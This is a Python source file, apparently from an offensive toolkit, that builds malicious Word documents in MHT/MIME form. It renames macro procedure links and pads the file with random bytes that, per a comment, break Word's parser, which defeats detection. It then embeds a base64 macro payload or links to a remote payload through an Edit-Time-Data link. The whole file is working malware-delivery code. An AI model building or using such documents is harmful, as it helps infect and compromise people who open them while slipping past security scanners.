#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: Isis (@0x1sis)

# taken from https://github.com/ttpreport/activemaim

from .activemime import ActiveMime
from uuid import uuid4
from base64 import b64encode
from random import randrange


class ActiveMimeMangler(ActiveMime):
    def __init__(self, raw_activemime):
        super().__init__(raw_activemime)
        self.prepended_data = b''
        self.remote_payload = None

    def rename_procedure_link(self, old_name, new_name):
        for link in self.magic_tail.procedures_links:
            link.update((k, new_name) for k, v in link.items() if v.upper() == old_name.upper())

    def set_prepended_data(self, data):
        self.prepended_data = data

    def generate_random_prepended_data(self):  # 0x0A breaks word parser
        return b''.join([randrange(11, 256).to_bytes(1) for _ in range(128)]) \
            + b'MIME' \
            + b''.join([randrange(11, 256).to_bytes(1) for _ in range(128)])

    def set_remote_payload(self, address):
        self.remote_payload = address

    def save_payload(self, filename):
        with open(filename, 'wb') as payload:
            payload.write(self.render())

    def save_document(self, filename):
        boundary = f'{str(uuid4())}'
        storage_path = f'file:///C:/{str(uuid4())}'

        if self.remote_payload:
            macro_file_path = self.remote_payload
        else:
            macro_file_path = f'{storage_path}/{str(uuid4())}'

        body = f'<link rel=Edit-Time-Data href="{macro_file_path}">'

        with open(filename, 'wb') as doc:
            if self.prepended_data:
                doc.write(self.prepended_data)
                doc.write(b'\r\n')

            doc.write(b'MIME-Version: 313.37\r\n')
            doc.write(f'Content-Type: multipart/related; boundary="{boundary}"\r\n\r\n'.encode())
            doc.write(f'--{boundary}\r\n'.encode())
            doc.write(f'Content-Location: {storage_path}/{str(uuid4())}\r\n'.encode())
            doc.write(b'Content-Transfer-Encoding: base64\r\n')
            doc.write(b'Content-Type: text/html; charset="utf-8"\r\n\r\n')
            doc.write(f'{b64encode(body.encode("UTF-8")).decode("UTF-8")}\r\n'.encode())

            if not self.remote_payload:
                doc.write(f'--{boundary}\r\n'.encode())
                doc.write(f'Content-Location: {macro_file_path}\r\n'.encode())
                doc.write(b'Content-Transfer-Encoding: base64\r\n')
                doc.write(b'Content-Type: text/html\r\n\r\n')
                doc.write(b64encode(self.render()))

            doc.write(f'\r\n--{boundary}--'.encode())